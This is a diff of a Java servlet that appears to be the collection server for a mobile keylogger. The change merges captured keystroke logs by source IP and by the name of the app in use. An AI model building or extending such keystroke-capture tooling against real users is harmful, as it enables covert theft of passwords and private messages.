@@ -34,15 +34,60 @@ public class NinjabotscmuServlet extends HttpServlet {
 		resp.setContentType("text/plain");
 		generateTimestampKeyInputsMap(keyInputs);
 		MobileApp app = new MobileApp();
-		app.setAppName("tempApp");
 		app.setSrcIP(srcIP);
 		app.setTimeStamp(timeStamp);
 		
 		if(keyInputs != null && keyInputs.isEmpty() == false)
 		{
+			app.setAppName("tempApp");
 			processKeyLoggerRequest(app);
 		}
+		//TODO: from python script send something like firstApp when you send the AppName for the first time instead of sending blankAppName
+		else
+		{
+			app.setAppName(appName);
+			processNinjaClassiferAppRequest(app);
+		}
 		logger.info(receivedParams.toString());
+	}
+
+	private void processNinjaClassiferAppRequest(MobileApp app) {
+		if(appList.size()==0)
+		{
+			appList.add(app);				
+		}
+		else
+		{
+			MobileApp latestApp = appList.get(appList.size()-1);
+			if(latestApp.getAppName().equals("tempApp"))
+			{
+				int appIndex = appList.lastIndexOf(app);
+				if(appIndex !=-1)
+				{
+					MobileApp existingApp = appList.get(appIndex);
+					appList.remove(latestApp);
+					existingApp.setKeyLog(existingApp.getKeyLog()+latestApp.getKeyLog());
+					existingApp.setTimeStamp(latestApp.getTimeStamp());
+				}
+				else
+				{
+					latestApp.setAppName(app.getAppName());
+				}
+			}
+			else
+			{					
+				int appIndex = appList.lastIndexOf(app);
+				if(appIndex !=-1)
+				{
+					MobileApp existingApp = appList.get(appIndex);
+					existingApp.setTimeStamp(latestApp.getTimeStamp());						
+				}
+				else
+				{
+					appList.add(app);
+				}
+			}
+		}
 	}
 
 	private void processKeyLoggerRequest(MobileApp app) {
